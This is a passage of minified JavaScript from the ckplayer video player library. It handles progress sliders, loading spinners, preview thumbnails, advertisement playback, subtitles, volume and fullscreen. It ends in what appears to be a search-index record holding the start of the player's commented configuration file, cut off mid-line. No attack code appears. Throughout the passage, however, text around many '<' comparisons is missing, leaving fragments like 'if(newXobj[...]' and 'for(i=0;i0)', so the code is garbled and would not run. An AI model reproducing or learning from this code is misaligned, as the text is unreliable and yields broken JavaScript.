newX=clientX-criterionWidth-referLeft;if(newXobj['refer'].offsetWidth-obj['slider'].offsetWidth){newX=obj['refer'].offsetWidth-obj['slider'].offsetWidth}if(obj['slider']===thisTemp.CB['timeButton']){if(!thisTemp.checkSlideLeft(newX,sliderLeft,obj['refer'].offsetWidth)){return}}thisTemp.css(obj['slider'],'left',newX+'px');thisTemp.css(obj['follow'],'width',(newX+obj['slider'].offsetWidth*0.5)+'px');var nowZ=calculation();if(obj['monitorFun']){obj['monitorFun'](nowZ)}};var mUp=function(event){thisTemp.removeListenerInside('mousemove',mMove,document);thisTemp.removeListenerInside('mouseup',mUp,document);if(obj['endFun']){obj['endFun'](calculation())}};var mOver=function(event){if(obj['overFun']){obj['overFun'](calculation())}};if(this.isUndefined(obj['removeListenerInside'])){this.addListenerInside('mousedown',mDown,obj['slider']);this.addListenerInside('mouseover',mOver,obj['slider'])}else{this.removeListenerInside('mousedown',mDown,obj['slider']);this.removeListenerInside('mouseover',mOver,obj['slider'])}},checkSlideLeft:function(newX,sliderLeft,refer){var timeSA=this.ckplayerConfig['config']['timeScheduleAdjust'];switch(timeSA){case 0:return false;break;case 2:if(newXsliderLeft){return false}break;case 4:if(!this.timeSliderLeftTemp){this.timeSliderLeftTemp=sliderLeft/refer}if(newXthis.timeSliderLeftTemp){this.timeSliderLeftTemp=timeSliderMax}}if(newX>this.timeSliderLeftTemp*refer){return false}break;default:return true;break}return true},loadingStart:function(rot){var thisTemp=this;if(this.isUndefined(rot)){rot=true}if(this.showFace){this.css(thisTemp.CB['loading'],'display','none')}if(this.timerLoading!=null){if(this.timerLoading.runing){this.timerLoading.stop()}this.timerLoading=null}var buffer=0;var loadingFun=function(){var nowRotate='0';try{nowRotate=thisTemp.css(thisTemp.CB['loadingCanvas'],'transform')||thisTemp.css(thisTemp.CB['loadingCanvas'],'-ms-transform')||thisTemp.css(thisTemp.CB['loadingCanvas'],'-moz-transform')||thisTemp.css(thisTemp.CB['loadingCanvas'],'-webkit-transform')||thisTemp.css(thisTemp.CB['loadingCanvas'],'-o-transform')||'0'}catch(event){}nowRotate=parseInt(nowRotate.replace('rotate(','').replace('deg);',''));nowRotate+=4;if(nowRotate>360){nowRotate=0}if(thisTemp.showFace){thisTemp.css(thisTemp.CB['loadingCanvas'],{transform:'rotate('+nowRotate+'deg)',msTransform:'rotate('+nowRotate+'deg)',mozTransform:'rotate('+nowRotate+'deg)',webkitTransform:'rotate('+nowRotate+'deg)',oTransform:'rotate('+nowRotate+'deg)'})}buffer++;if(buffer>=99){buffer=99}thisTemp.sendJS('buffer',buffer)};if(rot){this.timerLoading=new this.timer(10,loadingFun);if(this.showFace){this.css(thisTemp.CB['loading'],'display','block')}}else{thisTemp.sendJS('buffer',100)}},showFrontNext:function(){if(!this.showFace){return}if(this.vars['front']){this.css([this.CB['front'],this.CB['frontLine']],'display','block')}else{this.css([this.CB['front'],this.CB['frontLine']],'display','none')}if(this.vars['next']){this.css([this.CB['next'],this.CB['nextLine']],'display','block')}else{this.css([this.CB['next'],this.CB['nextLine']],'display','none')}},promptShow:function(ele,data){if(!this.showFace){return}var obj={};if(ele||data){if(!this.isUndefined(data)){obj=data}else{var offsetCoor=this.getCoor(ele);obj={title:this.getDataset(ele,'title'),x:offsetCoor['x']+ele.offsetWidth*0.5,y:offsetCoor['y']}}this.CB['prompt'].innerHTML=obj['title'];this.css(this.CB['prompt'],'display','block');var promoptWidth=this.getStringLen(obj['title'])*10;this.css(this.CB['promptBg'],'width',promoptWidth+'px');this.css(this.CB['prompt'],'width',promoptWidth+'px');promoptWidth+=10;var x=obj['x']-(promoptWidth*0.5);var y=this.PD.offsetHeight-obj['y']+8;if(xthis.PD.offsetWidth-promoptWidth){x=this.PD.offsetWidth-promoptWidth}this.css([this.CB['promptBg'],this.CB['prompt']],{display:'block',left:x+'px',bottom:y+'px'})}else{this.css([this.CB['promptBg'],this.CB['prompt']],{display:'none'})}},timerErrorFun:function(){var thisTemp=this;this.errorSend=false;var clearIntervalError=function(event){if(thisTemp.timerError!=null){if(thisTemp.timerError.runing){thisTemp.timerError.stop()}thisTemp.timerError=null}};var errorFun=function(event){clearIntervalError();thisTemp.error=true;thisTemp.errorUrl=thisTemp.getVideoUrl();if(!thisTemp.errorSend){thisTemp.errorSend=true;thisTemp.sendJS('error')}if(thisTemp.showFace){thisTemp.css(thisTemp.CB['errorText'],'display','block');thisTemp.css(thisTemp.CB['pauseCenter'],'display','none');thisTemp.css(thisTemp.CB['loading'],'display','none')}thisTemp.V.removeAttribute('poster');thisTemp.resetPlayer()};var errorListenerFun=function(event){setTimeout(function(){if(isNaN(thisTemp.V.duration)){errorFun(event)}},500)};if(!this.errorAdd){this.errorAdd=true;this.addListenerInside('error',errorListenerFun,this.V)}clearIntervalError();var timerErrorFun=function(){if(thisTemp.V&&parseInt(thisTemp.V.networkState)==3){errorFun()}};this.timerError=new this.timer(this.config['errorTime'],timerErrorFun)},judgeFullScreen:function(){var thisTemp=this;if(this.timerFull!=null){if(this.timerFull.runing){this.timerFull.stop()}this.timerFull=null}var fullFun=function(){thisTemp.isFullScreen()};this.timerFull=new this.timer(20,fullFun)},isFullScreen:function(){if(!this.showFace){return}var fullState=document.fullScreen||document.mozFullScreen||document.webkitIsFullScreen||document.msFullscreenElement;if(fullState&&!this.full){this.full=true;this.sendJS('full',true);this.elementCoordinate();this.css(this.CB['full'],'display','none');this.css(this.CB['escFull'],'display','block');if(this.vars['live']==0){this.timeUpdateHandler()}this.PD.appendChild(this.CB['menu'])}if(!fullState&&this.full){this.full=false;this.sendJS('full',false);this.elementCoordinate();this.css(this.CB['full'],'display','block');this.css(this.CB['escFull'],'display','none');if(this.timerFull!=null){if(this.timerFull.runing){this.timerFull.stop()}this.timerFull=null}if(this.vars['live']==0){this.timeUpdateHandler()}this.body.appendChild(this.CB['menu'])}},newMenu:function(){var thisTemp=this;var i=0;this.css(this.CB['menu'],{backgroundColor:'#FFFFFF',padding:'5px',position:'absolute',left:'10px',top:'20px',display:'none',zIndex:'999',color:'#A1A9BE',boxShadow:'2px 2px 3px #AAAAAA'});var mArr=this.contextMenu;var cMenu=this.ckplayerConfig['menu'];if(cMenu['name']){if(cMenu['link']){mArr[0]=[cMenu['name'],'link',cMenu['link']]}else{mArr[0]=[cMenu['name'],'default']}}if(cMenu['version']){mArr[1]=[cMenu['version'],'default','line']}if(cMenu['more']){if(typeof(cMenu['more'])=='object'){if(cMenu['more'].length>0){var moreArr=cMenu['more'];for(i=0;i0){for(var i=0;ibw-parseInt(arr[i].offsetWidth*0.5)){left=bw-parseInt(arr[i].offsetWidth*0.5)}this.css(arr[i],{left:left+'px',display:'block'})}},preview:function(obj){var thisTemp=this;var preview={file:null,scale:0};preview=this.standardization(preview,this.vars['preview']);if(preview['file']==null||preview['scale']0){var i=0;var imgW=0,imgH=0;var random=thisTemp.randomString(10);var loadNum=0;var loadImg=function(i){srcArr[i]=thisTemp.getNewUrl(srcArr[i]);var n=0;var img=new Image();img.src=srcArr[i];img.className=random+i;img.onload=function(event){loadNum++;if(thisTemp.previewDiv==null){imgW=img.width;imgH=img.height;thisTemp.previewWidth=parseInt(imgW*0.1);var ele=document.createElement('div');ele.className=random;thisTemp.PD.appendChild(ele);thisTemp.previewDiv=thisTemp.getByElement(random);var eleTop=(obj['y']-parseInt(imgH*0.1)+2);thisTemp.css(thisTemp.previewDiv,{width:srcArr.length*imgW*10+'px',height:parseInt(imgH*0.1)+'px',backgroundColor:'#000000',position:'absolute',left:'0px',top:eleTop+'px',display:'none',zIndex:'80'});ele.setAttribute('data-x','0');ele.setAttribute('data-y',eleTop);var ele2=document.createElement('div');ele2.className=random+'d2';thisTemp.PD.appendChild(ele2);thisTemp.previewTop=thisTemp.getByElement(ele2.className);thisTemp.css(thisTemp.previewTop,{width:parseInt(imgW*0.1)+'px',height:parseInt(imgH*0.1)+'px',position:'absolute',border:'5px solid '+thisTemp.css(thisTemp.CB['timeProgress'],'backgroundColor'),left:'0px',top:(obj['y']-parseInt(imgH*0.1)+2)+'px',display:'none',zIndex:'81'});var html='';for(n=0;n=imgW){sx=0;sy+=h}thisTemp.css(cimg,'display','none')}if(loadNum==srcArr.length){thisTemp.previewStart=2}else{i++;loadImg(i)}}}}loadImg(i);return}if(this.previewStart==2){var isTween=true;var nowNum=parseInt(obj['time']/this.vars['preview']['scale']);var numTotal=parseInt(thisTemp.getMetaDate()['duration']/this.vars['preview']['scale']);if(thisTemp.css(thisTemp.previewDiv,'display')=='none'){isTween=false}thisTemp.css(thisTemp.previewDiv,'display','block');var imgWidth=thisTemp.previewDiv.offsetWidth*0.01/srcArr.length;var left=(imgWidth*nowNum)-obj['x']+parseInt(imgWidth*0.5),top=obj['y']-thisTemp.previewDiv.offsetHeight;thisTemp.css(thisTemp.previewDiv,'top',top+2+'px');var topLeft=obj['x']-parseInt(imgWidth*0.5);var timepieces=0;if(topLeftthisTemp.PD.offsetWidth-imgWidth){topLeft=thisTemp.PD.offsetWidth-imgWidth;timepieces=obj['x']-topLeft-imgWidth*0.5}if(leftnumTotal*imgWidth-thisTemp.PD.offsetWidth){left=numTotal*imgWidth-thisTemp.PD.offsetWidth}thisTemp.css(thisTemp.previewTop,{left:topLeft+'px',top:top+2+'px',display:'block'});if(thisTemp.previewTop.offsetHeight>thisTemp.previewDiv.offsetHeight){thisTemp.css(thisTemp.previewTop,{height:thisTemp.previewDiv.offsetHeight-(thisTemp.previewTop.offsetHeight-thisTemp.previewDiv.offsetHeight)+'px'})}if(this.previewTween!=null){this.animatePause(this.previewTween);this.previewTween=null}var nowLeft=parseInt(thisTemp.css(thisTemp.previewDiv,'left'));var leftC=nowLeft+left;if(nowLeft==-(left+timepieces)){return}if(isTween){var obj={element:thisTemp.previewDiv,start:null,end:-(left+timepieces),speed:0.3};this.previewTween=this.animate(obj)}else{thisTemp.css(thisTemp.previewDiv,'left',-(left+timepieces)+'px')}}},deletePreview:function(){if(this.previewDiv!=null){this.deleteChild(this.previewDiv);this.previewDiv=null;this.previewStart=0}},changeVideo:function(){if(!this.html5Video){this.getVarsObject();this.V.newVideo(this.vars);return}var vArr=this.VA;var v=this.vars;var i=0;if(vArr.length0){this.needSeek=v['seek']}else{this.needSeek=0}if(this.getFileExt(vArr[0][0])!='.m3u8'){this.isM3u8=false}if(!this.isM3u8){if(vArr.length==1){this.V.innerHTML='';this.V.src=vArr[0][0]}else{var source='';vArr=this.arrSort(vArr);for(i=0;i';if(ad['link']){imgHtml=''+imgHtml+''}this.CB['adElement'].innerHTML=imgHtml;this.addListenerInside('load',function(){var imgObj=new Image();imgObj.src=this.src;var imgWH=thisTemp.adjustmentWH(imgObj.width,imgObj.height);thisTemp.css(thisTemp.getByElement(imgClass),{width:imgWH['width']+'px',height:imgWH['height']+'px',border:'0px'});thisTemp.css(thisTemp.CB['adElement'],{width:imgWH['width']+'px',height:imgWH['height']+'px',top:(height-imgWH['height'])*0.5+'px',left:(width-imgWH['width'])*0.5+'px'});thisTemp.ajaxSuccessNull(ad['exhibitionMonitor'])},this.getByElement(imgClass));this.addListenerInside('click',function(){thisTemp.ajaxSuccessNull(ad['clickMonitor'])},this.CB['adElement']);if(!this.isUndefined(ad['time'])){this.adCountDown()}}else{this.css(this.CB['adBar'],'display','block');if(this.adVideoMute){this.css(this.CB['adEscMute'],'display','block');this.css(this.CB['adMute'],'display','none')}else{this.css(this.CB['adEscMute'],'display','none');this.css(this.CB['adMute'],'display','block')}this.CB['adElement'].innerHTML='';if(this.videoTemp['currentSrc']==''){this.videoTemp['currentSrc']=this.getCurrentSrc()}if(this.V.loop){this.videoTemp['loop']=true;this.V.loop=false}if(this.V!=null&&this.V.currentTime>0&&this.adIsVideoTime&&this.adType!='front'){this.adIsVideoTime=false;this.needSeek=this.V.currentTime}this.V.src=ad['file'];this.V.currentSrc=ad['file'];this.V.innerHTML='';this.V.play();this.adVideoPlay=true;this.ajaxSuccessNull(ad['exhibitionMonitor']);if(!this.adVideoMute){this.adEscMuteFunction()}}if(ad['link']){this.css(this.CB['adLink'],'display','block');var link=''+this.language['adLink']+'';this.CB['adLink'].innerHTML=link;this.css(this.getByElement('ckadmorelink'),{color:'#FFFFFF',textDecoration:'none'});this.addListenerInside('click',function(){thisTemp.ajaxSuccessNull(ad['clickMonitor'])},this.CB['adLink'])}else{this.css(this.CB['adLink'],'display','none')}},adCountDown:function(){var thisTemp=this;if(this.adTimeTotal>0){if(!this.adIsPause){this.adTimeTotal--;this.showAdTime();this.adCountDownObj=null;this.adCountDownObj=setTimeout(function(){thisTemp.adCountDown()},1000)}}else{this.adI++;this.advertisementsPlay()}},adPlayerTimeHandler:function(time){var ad=this.getNowAdvertisements();var type=ad['type'];if(this.isStrImage(type)){return}if(this.adTimeTotal!=parseInt(time)){this.adTimeTotal=parseInt(time);this.showAdTime()}},showAdTime:function(){this.adTimeAllTotal--;var n=this.adTimeAllTotal;if(n0){setTimeout(function(){thisTemp.adOtherClose(i)},ad['time']*1000)}},adOtherClose:function(i){var ad=this.advertisements['other'][i];if(!this.isUndefined(ad['close'])){if(!ad['close']){ad['close']=true;this.PD.removeChild(this.getByElement(ad['div']));this.PD.removeChild(this.getByElement(ad['closeDiv']))}}},adOtherCloseAll:function(){if(!this.isUndefined(this.advertisements['other'])){var ad=this.advertisements['other'];for(var i=0;i-1;i--){if(t>=adTime[i]&&t1&&!adPlay[i]){this.adI=0;this.adType='insert';this.adMuteInto();this.adIsVideoTime=true;this.adPlayStart=true;this.adVideoPlay=false;this.videoPause();this.advertisementsTime();this.advertisementsPlay();this.adSkipButtonShow();adPlay[i]=true;for(var n=0;n=width||h>=height){if(width/w>height/h){nh=height-20;nw=w*nh/h}else{nw=width-20;nh=h*nw/w}}else{nw=w;nh=h}return{width:nw,height:nh}},ajaxSuccessNull:function(url){if(!this.isUndefined(url)){var ajaxObj={url:url,success:function(data){}};this.ajax(ajaxObj)}},runFunction:function(s){try{var arr=s.split('->');switch(arr[0]){case'javaScript':eval(arr[1]+'()');break;case'actionScript':eval('this.'+arr[1]+'()');break}}catch(event){}},sendVCanvas:function(){if(this.timerVCanvas==null){this.css(this.V,'display','none');this.css(this.MD,'display','block');var thisTemp=this;var videoCanvas=function(){if(thisTemp.MDCX.width!=thisTemp.PD.offsetWidth){thisTemp.MDC.width=thisTemp.PD.offsetWidth}if(thisTemp.MDCX.height!=thisTemp.PD.offsetHeight){thisTemp.MDC.height=thisTemp.PD.offsetHeight}thisTemp.MDCX.clearRect(0,0,thisTemp.MDCX.width,thisTemp.MDCX.height);var coor=thisTemp.getProportionCoor(thisTemp.PD.offsetWidth,thisTemp.PD.offsetHeight,thisTemp.V.videoWidth,thisTemp.V.videoHeight);thisTemp.MDCX.drawImage(thisTemp.V,0,0,thisTemp.V.videoWidth,thisTemp.V.videoHeight,coor['x'],coor['y'],coor['width'],coor['height'])};this.timerVCanvas=new this.timer(0,videoCanvas)}},pauseHandler:function(){var thisTemp=this;this.playShow(false);if(this.animatePauseArray.length>0){this.animatePause('pause')}if(this.playerType=='html5video'&&this.V!=null&&this.config['videoDrawImage']){this.stopVCanvas()}if(!this.isUndefined(this.advertisements['pause'])&&!this.adPlayStart&&!this.adPauseShow){setTimeout(function(){if(!thisTemp.isUndefined(thisTemp.advertisements['pause'])&&!thisTemp.adPlayStart&&!thisTemp.adPauseShow&&thisTemp.time>1){thisTemp.adPausePlayer()}},300)}},stopVCanvas:function(){if(this.timerVCanvas!=null){this.css(this.V,'display','block');this.css(this.MD,'display','none');if(this.timerVCanvas.runing){this.timerVCanvas.stop()}this.timerVCanvas=null}},playShow:function(b){if(!this.showFace){return}if(b){this.css(this.CB['play'],'display','none');this.css(this.CB['pauseCenter'],'display','none');this.css(this.CB['pause'],'display','block')}else{this.css(this.CB['play'],'display','block');if(this.css(this.CB['errorText'],'display')=='none'){if(!this.adPlayerPlay){this.css(this.CB['pauseCenter'],'display','block')}}else{this.css(this.CB['pauseCenter'],'display','none')}this.css(this.CB['pause'],'display','none')}},seekedHandler:function(){this.resetTrack();this.isTimeButtonMove=true;if(this.V.paused){if(this.hlsAutoPlay){this.videoPlay()}else{this.hlsAutoPlay=true}}},endedHandler:function(){if(this.adPlayerPlay){this.adI++;this.advertisementsPlay();return}if(!this.endAdPlay&&!this.isUndefined(this.advertisements['end'])){this.endAdPlay=true;this.adI=0;this.adType='end';this.adMuteInto();this.adIsVideoTime=true;this.adPlayStart=true;this.adVideoPlay=false;this.videoPause();this.advertisementsTime();this.advertisementsPlay();this.adSkipButtonShow();this.adReset=true;return}this.sendJS('ended');this.endedAdReset();if(this.vars['loop']){this.videoSeek(0)}},endedAdReset:function(){var arr=[];var i=0;if(!this.isUndefined(this.advertisements['insertPlay'])){arr=this.advertisements['insertPlay'];for(i=0;i0){this.time=this.V.currentTime;this.timeTextHandler();this.trackShowHandler();if(this.isTimeButtonMove){this.timeProgress(this.time,duration)}}},timeProgress:function(time,duration){if(!this.showFace){return}var timeProgressBgW=this.CB['timeProgressBg'].offsetWidth;var timeBOW=parseInt((time*timeProgressBgW/duration)-(this.CB['timeButton'].offsetWidth*0.5));if(timeBOW>timeProgressBgW-this.CB['timeButton'].offsetWidth){timeBOW=timeProgressBgW-this.CB['timeButton'].offsetWidth}if(timeBOW0){duration=this.vars['forceduration']}this.CB['timeText'].innerHTML=this.formatTime(time)+' / '+this.formatTime(duration);if(this.CB['timeText'].offsetWidth>0){this.buttonWidth['timeText']=this.CB['timeText'].offsetWidth}},bufferEdHandler:function(){if(!this.showFace||this.playerType=='flashplayer'){return}var thisTemp=this;var clearTimerBuffer=function(){if(thisTemp.timerBuffer!=null){if(thisTemp.timerBuffer.runing){thisTemp.sendJS('buffer',100);thisTemp.timerBuffer.stop()}thisTemp.timerBuffer=null}};clearTimerBuffer();var bufferFun=function(){if(!thisTemp.isUndefined(thisTemp.V)&&thisTemp.V.buffered.length>0){var duration=thisTemp.V.duration;var len=thisTemp.V.buffered.length;var bufferStart=thisTemp.V.buffered.start(len-1);var bufferEnd=thisTemp.V.buffered.end(len-1);var loadTime=bufferStart+bufferEnd;var loadProgressBgW=thisTemp.CB['timeProgressBg'].offsetWidth;var timeButtonW=thisTemp.CB['timeButton'].offsetWidth;var loadW=parseInt((loadTime*loadProgressBgW/duration)+timeButtonW);if(loadW>=loadProgressBgW){loadW=loadProgressBgW;clearTimerBuffer()}thisTemp.changeLoad(loadTime)}};this.timerBuffer=new this.timer(200,bufferFun)},changeLoad:function(loadTime){if(this.V==null){return}if(!this.showFace){return}var loadProgressBgW=this.CB['timeProgressBg'].offsetWidth;var timeButtonW=this.CB['timeButton'].offsetWidth;var duration=this.V.duration;if(isNaN(duration)||parseInt(duration)0){duration=this.vars['forceduration']}if(this.isUndefined(loadTime)){loadTime=this.loadTime}else{this.loadTime=loadTime}var loadW=parseInt((loadTime*loadProgressBgW/duration)+timeButtonW);this.css(this.CB['loadProgress'],'width',loadW+'px');this.sendJS('loadTime',loadTime);this.loadTimeTemp=loadTime},judgeIsLive:function(){var thisTemp=this;if(this.timerError!=null){if(this.timerError.runing){this.timerError.stop()}this.timerError=null}this.error=false;if(this.showFace){this.css(this.CB['errorText'],'display','none')}var timeupdate=function(event){thisTemp.timeUpdateHandler()};if(!this.vars['live']){if(this.V!=null&&this.playerType=='html5video'){this.addListenerInside('timeupdate',timeupdate);thisTemp.timeTextHandler();thisTemp.prompt();setTimeout(function(){thisTemp.bufferEdHandler()},200)}}else{this.removeListenerInside('timeupdate',timeupdate);if(this.timerTime!=null){window.clearInterval(this.timerTime);timerTime=null}if(this.timerTime!=null){if(this.timerTime.runing){this.timerTime.stop()}this.timerTime=null}var timeFun=function(){if(thisTemp.V!=null&&!thisTemp.V.paused&&thisTemp.showFace){thisTemp.CB['timeText'].innerHTML=thisTemp.getNowDate()}};this.timerTime=new this.timer(1000,timeFun)}this.definition()},loadTrack:function(def){if(this.playerType=='flashplayer'||this.vars['flashplayer']==true){return}if(this.isUndefined(def)){def=-1}var track=this.vars['cktrack'];var loadTrackUrl='';var type=this.typeString(track);var thisTemp=this;if(type=='array'){if(def==-1){var index=0;var indexN=0;for(var i=0;iindexN){indexN=li[2];index=i}}}else{index=def}loadTrackUrl=track[index][0]}else{loadTrackUrl=track}var obj={method:'get',dataType:'text',url:loadTrackUrl,charset:'utf-8',success:function(data){if(data){thisTemp.track=thisTemp.parseSrtSubtitles(data);thisTemp.trackIndex=0;thisTemp.nowTrackShow={sn:''}}}};this.ajax(obj)},resetTrack:function(){this.trackIndex=0;this.nowTrackShow={sn:''}},trackShowHandler:function(){if(!this.showFace||this.adPlayerPlay){return}if(this.track.length=this.track.length){this.trackIndex=0}var nowTrack=this.track[this.trackIndex];if(this.time>=nowTrack['startTime']&&this.time=arr[i]['startTime']&&this.time0.2?this.V.duration:this.getMetaDate()['duration'];if(duration>0&&time>duration){if(this.vars['forceduration']>0){time=0;this.sendJS('ended')}else{time=duration-0.1}}if(time>=0){this.V.currentTime=time;this.sendJS('seekTime',time)}},changeVolume:function(vol,bg,button){if(this.loaded){if(this.playerType=='flashplayer'){this.V.changeVolume(vol);return}}if(isNaN(vol)||this.isUndefined(vol)){vol=0}if(!this.loaded){this.vars['volume']=vol}if(!this.html5Video){this.V.changeVolume(vol);return}try{if(this.isUndefined(bg)){bg=true}}catch(e){}try{if(this.isUndefined(button)){button=true}}catch(e){}if(!vol){vol=0}if(vol1){vol=1}try{this.V.volume=vol}catch(error){}this.volume=vol;if(bg&&this.showFace){var bgW=vol*this.CB['volumeBg'].offsetWidth;if(bgWthis.CB['volumeBg'].offsetWidth){bgW=this.CB['volumeBg'].offsetWidth}this.css(this.CB['volumeUp'],'width',bgW+'px')}if(button&&this.showFace){var buLeft=parseInt(this.CB['volumeUp'].offsetWidth-(this.CB['volumeBO'].offsetWidth*0.5));if(buLeft>this.CB['volumeBg'].offsetWidth-this.CB['volumeBO'].offsetWidth){buLeft=this.CB['volumeBg'].offsetWidth-this.CB['volumeBO'].offsetWidth}if(buLeft0?this.V.volume:this.vars['volume']):this.vars['volume'];this.changeVolume(0)},videoEscMute:function(){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoEscMute();return}this.changeVolume(this.volumeTemp>0?this.volumeTemp:this.vars['volume'])},adMuteFunction:function(){if(!this.loaded){return}this.changeVolume(0);this.adVideoMute=true;this.css(this.CB['adEscMute'],'display','block');this.css(this.CB['adMute'],'display','none')},adEscMuteFunction:function(){if(!this.loaded){return}var v=this.ckplayerConfig['style']['advertisement']['videoVolume'];this.changeVolume(v);this.adMuteInto()},adMuteInto:function(){this.adVideoMute=false;this.css(this.CB['adEscMute'],'display','none');this.css(this.CB['adMute'],'display','block')},fastBack:function(){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.fastBack();return}var time=this.time-this.ckplayerConfig['config']['timeJump'];if(timethis.V.duration){time=this.V.duration}this.videoSeek(time)},getCurrentSrc:function(){if(!this.loaded){return}if(this.playerType=='flashplayer'){return this.V.getCurrentSrc()}return this.V.currentSrc},switchFull:function(){if(this.full){this.quitFullScreen()}else{this.fullScreen()}},fullScreen:function(){if(this.html5Video&&this.playerType=='html5video'){var element=this.PD;if(element.requestFullscreen){element.requestFullscreen()}else if(element.mozRequestFullScreen){element.mozRequestFullScreen()}else if(element.webkitRequestFullscreen){element.webkitRequestFullscreen()}else if(element.msRequestFullscreen){element.msRequestFullscreen()}else if(element.oRequestFullscreen){element.oRequestFullscreen()}this.judgeFullScreen()}else{}},quitFullScreen:function(){if(this.html5Video&&this.playerType=='html5video'){if(document.exitFullscreen){document.exitFullscreen()}else if(document.msExitFullscreen){document.msExitFullscreen()}else if(document.mozCancelFullScreen){document.mozCancelFullScreen()}else if(document.oRequestFullscreen){document.oCancelFullScreen()}else if(document.requestFullscreen){document.requestFullscreen()}else if(document.webkitExitFullscreen){document.webkitExitFullscreen()}else{this.css(document.documentElement,'cssText','');this.css(document.document.body,'cssText','');this.css(this.PD,'cssText','')}this.judgeFullScreen()}},videoRotation:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoRotation(n);return}if(this.isUndefined(n)){n=0}var tf=this.css(this.V,'transform');if(this.isUndefined(tf)&&!tf){tf='rotate(0deg)'}var reg=tf.match(/rotate\\([^)]+\\)/);reg=reg?reg[0].replace('rotate(','').replace('deg)',''):'';if(reg==''){reg=0}else{reg=parseInt(reg)}if(n==-1){reg-=90}else if(n==1){reg+=90}else{if(n!=90&&n!=180&&n!=270&&n!=-90&&n!=-180&&n!=-270){reg=0}else{reg=n}}n=reg;var y90=n%90,y180=n%180,y270=n%270;var ys=false;if(y90==0&&y180==90&&y270==90){ys=true}if(y90==0&&y180==90&&y270==0){ys=true}if(y90==-0&&y180==-90&&y270==-90){ys=true}if(y90==-0&&y180==-90&&y270==-0){ys=true}tf=tf.replace(/rotate\\([^)]+\\)/,'').replace(/scale\\([^)]+\\)/,'')+' rotate('+n+'deg)';var cdW=this.CD.offsetWidth,cdH=this.CD.offsetHeight,vW=this.V.videoWidth,vH=this.V.videoHeight;if(vW>0&&vH>0){if(ys){if(cdW/cdH>vH/vW){nH=cdH;nW=vH*nH/vW}else{nW=cdW;nH=vW*nW/vH}this.css(this.V,'transform','rotate(0deg)');this.css(this.V,'transform','scale('+nH/cdW+','+nW/cdH+')'+tf)}else{this.css(this.V,'transform',tf)}}else{this.css(this.V,'transform',tf)}return},videoBrightness:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoBrightness(n);return}},videoContrast:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoContrast(n);return}},videoSaturation:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoSaturation(n);return}},videoHue:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoHue(n);return}},videoZoom:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoZoom(n);return}if(this.isUndefined(n)){n=1}if(n2){n=2}var tf=this.css(this.V,'transform');tf=tf.replace(/scale\\([^)]+\\)/,'')+' scale('+n+')';this.videoScale=n;this.css(this.V,'transform',tf);return},videoProportion:function(w,h){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoProportion(w,h);return}},adPlay:function(){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.adPlay();return}if(this.adPlayerPlay){this.adIsPause=false;var ad=this.getNowAdvertisements();var type=ad['type'];if(this.isStrImage(type)){this.adCountDown()}else{this.V.play()}}},adPause:function(){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.adPause();return}if(this.adPlayerPlay){this.adIsPause=true;var ad=this.getNowAdvertisements();var type=ad['type'];if(type!='jpg'&&type!='jpeg'&&type!='png'&&type!='svg'&&type!='gif'){this.videoPause()}}},videoError:function(n){if(!this.loaded){return}if(this.playerType=='flashplayer'){this.V.videoError(n);return}},changeConfig:function(){if(!this.loaded){return}if(this.playerType=='flashplayer'){var args=Array.prototype.slice.call(arguments);switch(args.length){case 1:this.V.changeConfig(args[0]);break;case 2:this.V.changeConfig(args[0],args[1]);break;case 3:this.V.changeConfig(args[0],args[1],args[2]);break;case 4:this.V.changeConfig(args[0],args[1],args[2],args[3]);break;case 5:this.V.changeConfig(args[0],args[1],args[2],args[3],args[4]);break;case 6:this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5]);break;case 7:this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5],args[6]);break;case 8:this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5],args[6],args[7]);break;case 8:this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5],args[6],args[7],args[8]);break}return}var obj=this.ckplayerConfig;var arg=arguments;for(var i=0;i0){this.css(this.CD,'width',w+'px')}if(h>0){this.css(this.CD,'height',h+'px')}if(this.html5Video){this.elementCoordinate()}},changePlaybackRate:function(n){if(this.html5Video){var arr=this.playbackRateArr;n=parseInt(n);if(n","tags":""},{"title":"","url":"/js/ckplayer/ckplayer.js","text":"/* 软件名称：ckplayer 软件版本：X1 软件作者：niandeng 软件网站：http://www.ckplayer.com -------------------------------------------------------------------------------------------------------------------- 开发说明： 使用的主要程序语言：javascript(js)及actionscript3.0(as3.0)(as3.0主要用于flashplayer部分的开发，不在该页面呈现) 功能：播放视频 特点：兼容HTML5-VIDEO(优先)以及FlashPlayer -------------------------------------------------------------------------------------------------------------------- 使用开源代码部分： 1：flashls-http://flashls.org/ ===================================================================================================================== */ function ckplayerConfig() { return { flashvars: {},//用来补充flashvars里的对象 languagePath: '',//语言包文件地址 stylePath: '',//风格包文件地址 config: { fullInteractive: true,//是否开启交互功能 delay: 30,//延迟加载视频，单位：毫秒 timeFrequency: 100,//计算当前播放时间和加载量的时间频率，单位：毫秒 autoLoad: true,//视频是否自动加载 loadNext: 0,//多段视频预加载的段数，设置成0则全部加载 definition: true,//是否使用清晰度组件 subtitle:false,//是否使用多字幕切换组件 playbackRate:true,//是否使用倍速播放组件 smartRemove: true,//是否使用智能清理，使用该功能则在多段时当前播放段之前的段都会被清除出内存，减少对内存的使用 bufferTime: 200,//缓存区的长度，单位：毫秒,不要小于10 rtmpBufferTime:0,//rtmp视频缓存区长度，单位：毫秒 click: true,//是否支持屏幕单击暂停 doubleClick: true,//是否支持屏幕双击全屏 doubleClickInterval: 200,//判断双击的标准，即二次单击间隔的时间差之内判断为是双击，单位：毫秒 keyDown: { space: true,//是否启用空格键切换播放/暂停 left: true,//是否启用左方向键快退 right: true,//是否启用右方向键快进 up: true,//是否支持上方向键增加音量 down: true //是否支持下方向键减少音量 }, timeJump: 10,//快进快退时的秒数 volumeJump: 0.1,//音量调整的数量，大于0小于1的小数 timeScheduleAdjust: 